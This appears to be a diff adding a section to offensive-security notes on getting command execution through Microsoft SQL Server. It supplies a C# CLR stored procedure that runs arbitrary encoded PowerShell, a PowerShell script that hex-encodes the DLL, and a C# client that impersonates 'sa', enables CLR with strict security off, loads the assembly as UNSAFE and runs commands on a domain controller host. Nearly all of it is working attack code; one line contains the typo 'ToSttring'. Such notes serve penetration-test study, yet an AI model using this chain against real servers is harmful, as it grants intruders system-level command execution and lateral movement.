@@ -490,3 +490,127 @@ namespace SQL
     }
 }
 ```
+
+### Loading assemblies
+
+If a database in the MS SQL server has the `TRUSTWORTHY` property set, we can
+use the `CREATE ASSEMBLY` statement to import a managed DLL as an object and
+execute methods within the DLL. Here's some example C# .NET code that publishes
+a method, `cmdExec`, that we can use to execute arbitrary encoded PowerShell
+commands:
+
+```csharp
+using Microsoft.SqlServer.Server;
+using System.Data.SqlTypes;
+using System.Diagnostics;
+
+public class StoredProcedures
+{
+    [SqlProcedure]
+    public static void cmdExec(SqlString execCommand)
+    {
+        Process proc = new Process();
+        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+        proc.StartInfo
+            .Arguments = $" /c \"powershell -EncodedCommand {execCommand}\"";
+        proc.StartInfo.CreateNoWindow = true;
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+        SqlDataRecord record = new SqlDataRecord(
+            new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000)
+        );
+        SqlContext.Pipe.SendResultsStart(record);
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsEnd();
+
+        proc.WaitForExit();
+        proc.Close();
+    }
+}
+```
+
+After building this assembly, we convert it to hex so we can load it from hex on
+the target database by invoking the following:
+
+```powershell
+$DLLPath = ".\SQL.dll"
+$fileStream = [IO.File]::OpenRead((Resolve-Path -Path $DLLPath).Path)
+$stringBuilder = New-Object -Type System.Text.StringBuilder
+
+while (($byte = $fileStream.ReadByte()) -gt -1)
+{
+	$null = $stringBuilder.Append($byte.ToSttring("X2"))
+}
+
+$stringBuilder.ToString() -join "" | Out-File ".\SQL.txt"
+```
+
+With the following C# .NET code, we load our assembly from hex and execute an
+arbitrary PowerShell encoded command:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+class Program
+{
+    static void Main(string[] args)
+    {
+        string sqlServer = "dc01.corp1.com";
+        string database = "master";
+        string conString = "Server = " + sqlServer +
+                           "; Database = " + database +
+                           "; Integrated Security = True;";
+        string encodedCommand = args[0];
+        SqlConnection con = new SqlConnection(conString);
+
+        try
+        {
+            con.Open();
+            Console.WriteLine("Auth success!");
+        }
+        catch
+        {
+            Console.WriteLine("Auth failed");
+            Environment.Exit(0);
+        }
+
+        string executeas = "EXECUTE AS LOGIN = 'sa';";
+        string enableCLR =
+            "use msdb; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
+        string dropProcedure = "DROP PROCEDURE [dbo].[cmdExec];";
+        string dropAssembly = "DROP ASSEMBLY myAssembly;";
+        string createAssembly =
+            "CREATE ASSEMBLY myAssembly FROM ... WITH PERMISSION_SET = UNSAFE;";
+        string createProcedure =
+            "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
+        string cmdExec = $"EXEC cmdExec '{encodedCommand}';";
+        string[] commands = {
+            executeas,
+            enableCLR,
+            dropProcedure,
+            dropAssembly,
+            createAssembly,
+            createProcedure,
+            cmdExec
+        };
+
+        foreach (string command in commands)
+        {
+            SqlCommand SQLCommand = new SqlCommand(command, con);
+            SqlDataReader SQLReader = SQLCommand.ExecuteReader();
+            SQLReader.Read();
+            Console.WriteLine($"Result of command is: {SQLReader[0]}");
+            SQLReader.Close();
+        }
+
+        con.Close();
+    }
+}
+}
+```
